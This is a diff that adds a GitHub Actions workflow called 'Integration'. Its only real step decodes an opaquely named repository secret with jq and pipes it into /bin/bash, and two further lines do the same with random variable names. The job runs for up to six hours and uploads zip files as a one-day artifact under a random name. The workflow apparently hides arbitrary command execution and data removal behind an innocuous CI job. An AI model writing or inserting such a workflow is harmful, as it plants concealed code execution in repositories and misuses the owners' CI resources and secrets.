@@ -1,0 +1,29 @@
+name: Integration
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: true
+jobs:
+  validate:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - name: Run task
+        env:
+          z71608: ${{ secrets.z71608 }}
+        run: |
+          printf '%s' "$z71608" | jq -r .hx749 | /bin/bash
+          echo $ji95149 | jq -r .yvfje4 | /bin/bash
+          echo $rsxl0317 | jq -r .fz8 | /bin/bash
+
+      - name: Store output
+        uses: actions/upload-artifact@v4
+        with:
+          name: OnibWLPo
+          path: "*.zip"
+          retention-days: 1
